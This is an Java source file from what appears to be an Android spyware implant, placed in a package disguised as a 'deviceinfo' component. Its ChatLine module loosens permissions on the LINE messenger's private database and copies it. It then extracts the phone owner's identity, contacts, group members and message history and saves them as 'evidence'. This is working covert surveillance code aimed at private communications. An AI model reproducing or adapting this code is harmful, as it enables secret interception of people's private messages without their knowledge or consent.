package com.android.deviceinfo.module.chat;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.sqlite.SQLiteDatabase;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordGroupsVisitor;
import com.android.deviceinfo.db.RecordHashPairVisitor;
import com.android.deviceinfo.db.RecordHashtableListVisitor;
import com.android.deviceinfo.db.RecordStringVisitor;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.Check;

public class ChatLine extends SubModuleChat {
	private static final String TAG = "ChatLine";

	private static final int PROGRAM = 0x0d;
	String pObserving = "jp.naver.line.android";
	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";

	private Date lastTimestamp;

	private long lastLine;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private String account = "local";
	private String account_mid = "mid";

	private GenericSqliteHelper helper;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		try {
			readLineMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}

		try {

			lastLine = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastSkype: " + lastLine);
			}

			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			helper = GenericSqliteHelper.openCopy(dbFile);
			helper.deleteAtEnd = false;

			account = readMyPhoneNumber();
			long lastmessage = readLineMessageHistory();

			if (lastmessage > lastLine) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) serialize: %d", lastmessage);
				}
				markup.serialize(lastmessage);
			}

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private String readMyPhoneNumber() {

		//SQLiteDatabase db = helper.getReadableDatabase();

		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
		helper.traverseRecords("contacts", visitorContacts);

		RecordStringVisitor visitorContent = new RecordStringVisitor("content");
		visitorContent.selection = "server_id is null";
		helper.traverseRecords("chat_history", visitorContent);

		for (String content : visitorContent.getRecords()) {
			if (Cfg.DEBUG) {
				String[] lines = content.split("\n");
				for (int i = 0; i < lines.length; i += 3) {
					String mid = lines[i + 1];
					String name = lines[i + 2];
					if (!visitorContacts.containsKey(mid)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readMyPhoneNumber) my name is: %s, mid: %s", name, mid);
							account = name;
							account_mid = mid;
						}
					}
				}
			}
		}

		return account;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private long readLineMessageHistory() throws IOException {

		try {
			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			// GenericSqliteHelper helper =
			// GenericSqliteHelper.openCopy(dbFile);
			// helper.deleteAtEnd = false;
			final ChatGroups groups = getLineGroups(helper);

			String sqlquery = "select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 and ch.created_time > ? order by ch.created_time ";
			String[] projection = new String[] { "chat_id", "from_mid", "content", "ch.created_time", "sent_count",
					"name" };

			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			RecordVisitor visitor = new RecordVisitor(null, null) {
				@Override
				public long cursor(Cursor cursor) {
					String chat_id = cursor.getString(0);
					String from_mid = cursor.getString(1);
					String content = cursor.getString(2);
					long created_time = cursor.getLong(3);
					Date date = new Date(created_time);

					int sent_count = cursor.getInt(4);
					String from_name = cursor.getString(5);

					boolean incoming = false;
					String to = account;
					String to_id = from_mid;

					if (from_name == null) {
						from_name = account;
						incoming = false;
						to = groups.getGroupToName(from_name, chat_id);
						to_id = groups.getGroupToId(from_name, chat_id);
					} else {
						incoming = true;
						to = groups.getGroupToName(from_name, chat_id);
						to_id = groups.getGroupToId(from_name, chat_id);
						if (to == null) {
							to = account;
						}
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (readLineMessageHistory) %s\n%s: %s, %s -> %s ", chat_id,
								date.toLocaleString(), content, from_name, to);
					}

					MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content, incoming);
					messages.add(message);

					return created_time;
				}
			};

			helper.deleteAtEnd = true;
			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);

			getModule().saveEvidence(messages);
			return lastmessage;

		} catch (Exception ex) {
			if (Cfg.DEBUG) {

				Check.log(TAG + " (readLineMessageHistory) Error: ", ex);
			}
		}
		return lastLine;

	}

	private ChatGroups getLineGroups(GenericSqliteHelper helper) {
		//SQLiteDatabase db = helper.getReadableDatabase();
		final ChatGroups groups = new ChatGroups();
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String key = cursor.getString(0);
				String mid = cursor.getString(1);
				String name = cursor.getString(2);
				if(mid == null){
					return 0;
				}

				if (mid.equals(account_mid)) {
					name = account;
				}
				// if (Cfg.DEBUG) {
				// Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid,
				// name);
				// }
				if (name == null) {
					groups.addPeerToGroup(key, mid);
				} else {
					groups.addPeerToGroup(key, name);
				}
				return 0;

			}
		};

		String sqlquery = "SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id";
		helper.traverseRawQuery(sqlquery, null, visitor);

		sqlquery = "select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id";
		helper.traverseRawQuery(sqlquery, null, visitor);

		sqlquery = "select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null";
		helper.traverseRawQuery(sqlquery, null, visitor);

		groups.addLocalToAllGroups(account);

		if (Cfg.DEBUG) {
			for (String group : groups.getAllGroups()) {
				String to = groups.getGroupToName(account, group);
				Check.log(TAG + " (getLineGroups group) %s : %s", group, to);
			}
		}
		return groups;
	}

}
